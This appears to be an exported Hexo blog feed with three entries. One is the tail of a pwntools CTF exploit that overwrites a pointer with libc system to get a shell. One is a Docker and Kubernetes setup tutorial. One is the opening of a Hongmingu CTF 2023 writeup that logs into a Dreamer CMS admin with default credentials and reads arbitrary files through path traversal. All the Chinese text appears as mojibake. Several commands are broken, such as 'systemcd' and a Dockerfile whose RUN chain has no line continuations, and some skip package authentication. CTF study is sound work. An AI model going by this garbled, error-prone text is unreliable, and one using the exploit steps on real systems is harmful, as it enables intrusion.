u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">system_addr = addr-<span class="number">0x3940</span></span><br><span class="line">edit(-<span class="number">15</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="å†™åœ¨æœ€å"><a class="markdownIt-Anchor" href="#å†™åœ¨æœ€å"></a> å†™åœ¨æœ€å</h2>
<p>èƒ½å¤Ÿçœ‹å®Œæˆ–è€…çœ‹åˆ°è¿™ç¯‡Writeupï¼Œå¯¹æˆ‘æ¥è¯´è¿™æ˜¯ä¸€ä¸ªå¾ˆå¹¸ç¦çš„äº‹å„¿ã€‚è™½ç„¶æ¯”èµ›è¿‡ç¨‹åå·ï¼Œå´åˆè®©æˆ‘æ‰¾å›æ¥æœ€å¼€å§‹æ‰“CTFæ—¶çš„ä¹è¶£ï¼Œè¿™ç§ä¸é•¿ä¸çŸ­çš„æ—¶é—´ï¼Œä¸å¤šä¸å°‘çš„èµ›é¢˜é‡ï¼Œå¾ˆé€‚åˆç”¨æ¥ç¼“å†²ç¼“å†²ç°åœ¨æµ®èºçš„CTFåœˆå­ã€‚</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>Reverse</tag>
        <tag>Pwn</tag>
        <tag>Misc</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerä¸K8Så­¦ä¹ -1å®‰è£…å’Œé…ç½®</title>
    <url>/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>Dockerä¸K8så­¦ä¹ -1å®‰è£…å’Œé…ç½®</p>
<span id="more"></span>
<h1 id="dockerä¸k8så­¦ä¹ -1å®‰è£…å’Œé…ç½®"><a class="markdownIt-Anchor" href="#dockerä¸k8så­¦ä¹ -1å®‰è£…å’Œé…ç½®"></a> Dockerä¸K8så­¦ä¹ -1å®‰è£…å’Œé…ç½®</h1>
<h2 id="æ¢æº"><a class="markdownIt-Anchor" href="#æ¢æº"></a> æ¢æº</h2>
<h3 id="aptæ¢æº"><a class="markdownIt-Anchor" href="#aptæ¢æº"></a> aptæ¢æº</h3>
<h4 id="1å¤‡ä»½åŸæ¥çš„æº"><a class="markdownIt-Anchor" href="#1å¤‡ä»½åŸæ¥çš„æº"></a> 1.å¤‡ä»½åŸæ¥çš„æºï¼š</h4>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo cp <span class="regexp">/etc/</span>apt<span class="regexp">/sources.list /</span>etc<span class="regexp">/apt/</span>sources.list.bak</span><br></pre></td></tr></table></figure>
<h4 id="22æ‰“å¼€etcaptsourceslistæ–‡ä»¶"><a class="markdownIt-Anchor" href="#22æ‰“å¼€etcaptsourceslistæ–‡ä»¶"></a> 2.2.æ‰“å¼€/etc/apt/sources.listæ–‡ä»¶</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<p>å›½å†…aptæºï¼Œè¿™é‡Œä»¥é˜¿é‡Œæºå’Œæ¸…åæºä¸ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ·»åŠ é˜¿é‡Œæº</span></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment">#æ·»åŠ æ¸…åæº</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse</span></span><br></pre></td></tr></table></figure>
<p>æ·»åŠ è‡³/etc/apt/sources.listæ–‡ä»¶ä¸­å¹¶ä¿å­˜ã€‚</p>
<h4 id="3æ›´æ–°"><a class="markdownIt-Anchor" href="#3æ›´æ–°"></a> 3.æ›´æ–°</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure>
<h3 id="pipæ¢æº"><a class="markdownIt-Anchor" href="#pipæ¢æº"></a> pipæ¢æº</h3>
<h4 id="1åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¿®æ”¹~pippipconfpipé…ç½®æ–‡ä»¶"><a class="markdownIt-Anchor" href="#1åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¿®æ”¹~pippipconfpipé…ç½®æ–‡ä»¶"></a> 1.åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»º/ä¿®æ”¹<code>ï½/.pip/pip.conf</code>pipé…ç½®æ–‡ä»¶ï¼›</h4>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">touch ï½<span class="regexp">/.pip/</span>pip.conf</span><br></pre></td></tr></table></figure>
<h4 id="2è¿›å…¥æ–‡ä»¶æ–°å¢ä¿®æ”¹å†…å®¹"><a class="markdownIt-Anchor" href="#2è¿›å…¥æ–‡ä»¶æ–°å¢ä¿®æ”¹å†…å®¹"></a> 2.è¿›å…¥æ–‡ä»¶æ–°å¢/ä¿®æ”¹å†…å®¹ï¼›</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host = https://pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
<h2 id="docker"><a class="markdownIt-Anchor" href="#docker"></a> Docker</h2>
<h3 id="ä¸‹è½½å®‰è£…"><a class="markdownIt-Anchor" href="#ä¸‹è½½å®‰è£…"></a> ä¸‹è½½å®‰è£…</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install docker.io</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo pip install docker-compose</span></span><br></pre></td></tr></table></figure>
<h3 id="æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ"><a class="markdownIt-Anchor" href="#æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ"></a> æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo docker version</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230509122142527.png" alt="image-20230509122142527"></p>
<h3 id="dockeræ¢æº"><a class="markdownIt-Anchor" href="#dockeræ¢æº"></a> dockeræ¢æº</h3>
<h4 id="1åˆ›å»ºæˆ–ä¿®æ”¹-etcdockerdaemonjson-æ–‡ä»¶"><a class="markdownIt-Anchor" href="#1åˆ›å»ºæˆ–ä¿®æ”¹-etcdockerdaemonjson-æ–‡ä»¶"></a> 1.åˆ›å»ºæˆ–ä¿®æ”¹ /etc/docker/daemon.json æ–‡ä»¶</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano  /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
<h4 id="2æ’å…¥æºè¿æ¥"><a class="markdownIt-Anchor" href="#2æ’å…¥æºè¿æ¥"></a> 2.æ’å…¥æºè¿æ¥</h4>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://registry.hub.docker.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://registry.docker-cn.com&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="3æŸ¥çœ‹æ˜¯å¦æ¢æºæˆåŠŸ"><a class="markdownIt-Anchor" href="#3æŸ¥çœ‹æ˜¯å¦æ¢æºæˆåŠŸ"></a> 3.æŸ¥çœ‹æ˜¯å¦æ¢æºæˆåŠŸ</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker info</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230512033234457.png" alt="image-20230512033234457"></p>
<h4 id="é‡å¯dockerå¹¶è®¾ç½®å¼€æœºå¯åŠ¨"><a class="markdownIt-Anchor" href="#é‡å¯dockerå¹¶è®¾ç½®å¼€æœºå¯åŠ¨"></a> é‡å¯dockerï¼Œå¹¶è®¾ç½®å¼€æœºå¯åŠ¨</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line">systemcd <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line">systemcd start docker</span><br></pre></td></tr></table></figure>
<h2 id="k8s"><a class="markdownIt-Anchor" href="#k8s"></a> K8S</h2>
<h3 id="æœ¬åœ°å®‰è£…k8s"><a class="markdownIt-Anchor" href="#æœ¬åœ°å®‰è£…k8s"></a> æœ¬åœ°å®‰è£…K8S</h3>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å®‰è£… https å·¥å…·ä»¥åŠ k8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https curl</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl --allow-unauthenticated</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°æŠ¥é”™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">No apt package <span class="string">&quot;kubeadm&quot;</span>, but there is a snap with that name.</span><br><span class="line">Try <span class="string">&quot;snap install kubeadm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">No apt package <span class="string">&quot;kubectl&quot;</span>, but there is a snap with that name.</span><br><span class="line">Try <span class="string">&quot;snap install kubectl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">No apt package <span class="string">&quot;kubelet&quot;</span>, but there is a snap with that name.</span><br><span class="line">Try <span class="string">&quot;snap install kubelet&quot;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä½¿ç”¨çš„æºé‡Œæ²¡æœ‰è¿™ä¸ªåº“ï¼Œæ‰¾ä¸€ä¸ªæœ‰è¿™ä¸ªåº“çš„æºæ·»åŠ ä¸Šå»å³å¯ï¼š</p>
<p>è·å–aliyunçš„key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | sudo apt-key add</span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€<code>/etc/apt/sources.list</code>æ–‡ä»¶ï¼Œæ·»åŠ æºé“¾æ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial main</span><br></pre></td></tr></table></figure>
<p>å†æ¬¡æ‰§è¡Œå®‰è£…å‘½ä»¤</p>
<p>æœ€åæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm init</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230512034345692.png" alt="image-20230512034345692"></p>
<p>ï¼ˆåˆ°è¿™é‡Œï¼Œdockerå’ŒK8sçš„æœ¬åœ°å®‰è£…å·¥ä½œå·²ç»å…¨éƒ¨å®Œæˆï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½®é•œåƒäº†ï¼‰</p>
<h2 id="dockerå®¹å™¨ä¸­é…ç½®å®‰è£…k8s"><a class="markdownIt-Anchor" href="#dockerå®¹å™¨ä¸­é…ç½®å®‰è£…k8s"></a> Dockerå®¹å™¨ä¸­é…ç½®å®‰è£…K8S</h2>
<h3 id="dockeræ‹‰å–ubuntuå®¹å™¨"><a class="markdownIt-Anchor" href="#dockeræ‹‰å–ubuntuå®¹å™¨"></a> dockeræ‹‰å–ubuntuå®¹å™¨</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230512232424025.png" alt="image-20230512232424025"></p>
<h3 id="å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨"><a class="markdownIt-Anchor" href="#å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨"></a> å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230512232543441.png" alt="image-20230512232543441"></p>
<h3 id="é…ç½®å®‰è£…k8s"><a class="markdownIt-Anchor" href="#é…ç½®å®‰è£…k8s"></a> é…ç½®å®‰è£…K8s</h3>
<p>ä¾æ¬¡æ‰§è¡Œä¸‹é¢çš„å®‰è£…å‘½ä»¤ï¼Œé€”ä¸­é‡åˆ°çš„è½¯ä»¶åº“çš„ç‰ˆæœ¬è¿‡é«˜æˆ–è¿‡ä½ï¼Œå…ˆå¸è½½é‡è£…å³å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl</span><br><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - <span class="comment">#è·å–aliyunçš„æºçš„key</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span></span><br><span class="line"><span class="string">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span></span><br><span class="line"><span class="string">EOF</span> <span class="comment">#å°†è¢«æºé…ç½®å†™åˆ°é…ç½®æ–‡ä»¶ä¸­</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y kubectl kubeadm kubelet <span class="comment">#å®‰è£…æœ€æ–°ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£…è¿‡ç¨‹éœ€è¦æ—¶é—´è¾ƒä¹…ï¼Œå¯ä»¥çœ‹ç‚¹å…¶ä»–ç›¸å…³çš„ ï¼š(</p>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230513015901872.png" alt="image-20230513015901872"></p>
<h3 id="ä¸‹è½½å®Œæˆåä¿å­˜é…ç½®é€€å‡ºå®¹å™¨"><a class="markdownIt-Anchor" href="#ä¸‹è½½å®Œæˆåä¿å­˜é…ç½®é€€å‡ºå®¹å™¨"></a> ä¸‹è½½å®Œæˆåï¼Œä¿å­˜é…ç½®é€€å‡ºå®¹å™¨ï¼š</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<h2 id="æ‰“åŒ…æ–¹æ³•ä¸€-å°†kuberneteså®¹å™¨æ‰“åŒ…ä¸ºdockeré•œåƒ"><a class="markdownIt-Anchor" href="#æ‰“åŒ…æ–¹æ³•ä¸€-å°†kuberneteså®¹å™¨æ‰“åŒ…ä¸ºdockeré•œåƒ"></a> æ‰“åŒ…æ–¹æ³•ä¸€ã€å°†Kuberneteså®¹å™¨æ‰“åŒ…ä¸ºDockeré•œåƒ</h2>
<p>æŸ¥çœ‹idå·ï¼Œåˆ›é€ é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">$ docker commit &lt;container <span class="built_in">id</span>&gt; twe1v3-k8s-image<span class="comment">#è¿™é‡Œçš„idæ˜¯ubuntuçš„idå·é‡å‘½åä¸ºtwe1v3-k8s-image</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230513021215073.png" alt="image-20230513021215073"></p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†Kuberneteså®¹å™¨æ‰“åŒ…ä¸ºDockeré•œåƒï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker save twe1v3-k8s-image &gt; twe1v3-k8s-image.tar</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ åˆ°é•œåƒä»“åº“ï¼šå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†Dockeré•œåƒä¸Šä¼ åˆ°é•œåƒä»“åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">$ docker tag twe1v3-k8s-image &lt;repo url&gt;/twe1v3-k8s-image</span><br><span class="line">$ docker push &lt;repo url&gt;/twe1v3-k8s-image</span><br></pre></td></tr></table></figure>
<p>è‡³æ­¤å¸¸è§„æ‰“åŒ…çš„æ–¹å¼å·²ç»å®Œæˆï¼Œé¼“æŒæ’’èŠ±ï¼ï¼ï¼</p>
<p>ä¸‹é¢çš„å†…å®¹å°†æ˜¯ä½¿ç”¨ç°è¡Œçš„æ–¹æ³•ä½¿ç”¨<strong>Dockerfile</strong>çš„æ–¹å¼æ¥æ‰“åŒ…é•œåƒï¼š</p>
<h2 id="æ‰“åŒ…æ–¹æ³•äºŒ-ä½¿ç”¨dockerfileçš„æ–¹å¼æ¥å°è£…k8sçš„dockeré•œåƒ"><a class="markdownIt-Anchor" href="#æ‰“åŒ…æ–¹æ³•äºŒ-ä½¿ç”¨dockerfileçš„æ–¹å¼æ¥å°è£…k8sçš„dockeré•œåƒ"></a> æ‰“åŒ…æ–¹æ³•äºŒã€ä½¿ç”¨Dockerfileçš„æ–¹å¼æ¥å°è£…K8sçš„dockeré•œåƒ</h2>
<p>è¿™é‡Œçš„æ‰€æœ‰å‰ç½®æ­¥éª¤éƒ½å¯ä»¥ç›¸åŒï¼Œä¸»è¦æ˜¯ä½¿ç”¨<code>Dockerfile</code>æ¥å°è£…é…ç½®å®‰è£…çš„è¿‡ç¨‹ï¼Œçœå»äº†åç»­æ–°å»ºæ—¶çš„å¤æ‚æ“ä½œ</p>
<h3 id="ç¼–å†™dockerfile"><a class="markdownIt-Anchor" href="#ç¼–å†™dockerfile"></a> ç¼–å†™Dockerfile</h3>
<p><code>Dockerfile</code>ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get -y install gnupg apt-transport-https curl \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main&quot;</span> &gt; /etc/apt/sources.list.d/kubernetes.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get -y install kubectl kubeadm kubelet</span></span><br><span class="line">    &amp;&amp; systemctl enable kubelet</span><br><span class="line">    &amp;&amp; systemctl restart kubelet</span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;bash&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„<code>Dockerfile</code>å†…å®¹æ‹‰å–çš„é•œåƒè¯·ä¿®æ”¹ä¸ºè‡ªå·±å…ˆå‰æ‹‰å–çš„ubuntué•œåƒï¼Œä¿å­˜åé€€å‡ºï¼Œå†™å…¥<code>Dockerfile</code>çš„æ—¶å€™è®°å¾—æŠŠæ³¨é‡Šå»æ‰å—·ã€‚</p>
<h3 id="æ„å»ºdockeré•œåƒ"><a class="markdownIt-Anchor" href="#æ„å»ºdockeré•œåƒ"></a> æ„å»ºDockeré•œåƒ</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker build -t twe1v3-df-k8s-image .</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230513024522287.png" alt="image-20230513024522287"></p>
<p>æ‰§è¡Œ<code>docker imags</code>æŸ¥çœ‹æ˜¯å¦æ–°å»ºæˆåŠŸï¼š</p>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230513030659678.png" alt></p>
<p>è¿è¡Œé•œåƒï¼Œå¹¶è¿›å…¥å®¹å™¨å†…æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it twe1v3-df-k8s-image bash</span><br><span class="line"></span><br><span class="line">kubectl</span><br></pre></td></tr></table></figure>
<p><img src="/2023/05/Docker%E4%B8%8EK8S%E5%AD%A6%E4%B9%A0-1%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/image-20230513032748974.png" alt="image-20230513032748974"></p>
<p>è‡³æ­¤å·²å®Œæˆdockerçš„ubuntuçš„k8sé•œåƒçš„å°è£…å’Œæ‰“åŒ…ã€‚</p>
<p><s>é…ç½®ä¸€ä¸ªshæˆ–è®¸ä¼šæ›´å¿«é”®å“ˆå“ˆå“ˆ</s></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯å­¦ä¹ </tag>
        <tag>Docker</tag>
        <tag>K8s</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢æ˜è°·CTF-2023--ä¸ªäººWriteup</title>
    <url>/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/</url>
    <content><![CDATA[<p>è¿™æ¯”èµ›è¿˜æ˜¯è›®å¯æƒœçš„ï¼Œå·®ä¸€é“é¢˜æ²¡äº¤ä¸Šï¼Œç—›å¤±ä¸€ä¸ªçº¿ä¸‹é¢åŸºå¸ˆå‚…ä»¬çš„æœºä¼šT_T</p>
<span id="more"></span>
<h1 id="çº¢æ˜è°·ctf-2023ä¸ªäººwriteup"><a class="markdownIt-Anchor" href="#çº¢æ˜è°·ctf-2023ä¸ªäººwriteup"></a> çº¢æ˜è°·CTF-2023â€“ä¸ªäººWriteup</h1>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h2>
<h3 id="ç‚¹å‡»ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç‚¹å‡»ç­¾åˆ°"></a> <strong>ç‚¹å‡»ç­¾åˆ°</strong></h3>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNb7ZTAnAjZDBoIJjTbXPbRr.png" alt="img"></p>
<p>è¿ç»­ç‚¹å‡»å³å¯è·å–flagï¼š</p>
<p>flag{1efe5dac-692a-47b8-b32d-ff737af384a7}</p>
<h3 id="dreamer"><a class="markdownIt-Anchor" href="#dreamer"></a> <strong>Dreamer</strong></h3>
<p>è®¿é—®ç®¡ç†å‘˜ç›®å½•/admin</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">uername:</span>wangjn</span><br><span class="line"><span class="symbol">password:</span><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>æ ç›®æ–‡ç« ç®¡ç†å¤„ï¼Œåˆ›å»ºé¡¶çº§æ ç›®</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNYE_JFyU4ZHAJBLMRufmflv.png" alt="img"></p>
<p>è®¾ç½®æ ç›®</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNbbkAAlSd9Ck689zHiaRd0Y.png" alt="img"></p>
<p>ç›®å½•ç©¿è¶Šï¼Œä»»æ„æ–‡ç« è¯»å–</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNZ6rF3cihNPxqj3BB9URFMi.png" alt="img"></p>
<p>ä¸»é¡µè®¿é—®æ ç›®flag</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAABY8QiNZze8YHvN5DKLGTRJBPDVm8.png" alt="img"></p>
<p>flag{9dce33c6-3a2b-4235-a35c-86401e8df9b2}</p>
<h3 id="dreamer_revenge"><a class="markdownIt-Anchor" href="#dreamer_revenge"></a> <strong>Dreamer_revenge</strong></h3>
<p>è®¿é—®ç®¡ç†å‘˜ç›®å½•/admin</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">uername:</span>wangjn</span><br><span class="line"><span class="symbol">password:</span><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ„é€ ä¸€ä¸ªä¸»é¢˜åŒ…ï¼Œé‡Œé¢ä¿®æ”¹è·¯å¾„ï¼Œå¯è¯»æ‰€æœ‰æ–‡ä»¶</p>
<p>æ‰¾åˆ°dreamer_cms-Previous_Releases_4.1.3/src/main/resources/db/dreamer-cms/templatesæ–‡ä»¶å¤¹</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVK0kkKZba5NW6nHDH9C2-KU.png" alt="img"></p>
<p>ä¿®æ”¹default_v2æ–‡ä»¶å¤¹ä¸‹çš„theme.jsonæ–‡ä»¶çš„themePath</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/AgAAEQXTVVJTRkCC9aZCC4bp7TQCxwRh.png" alt="img"></p>
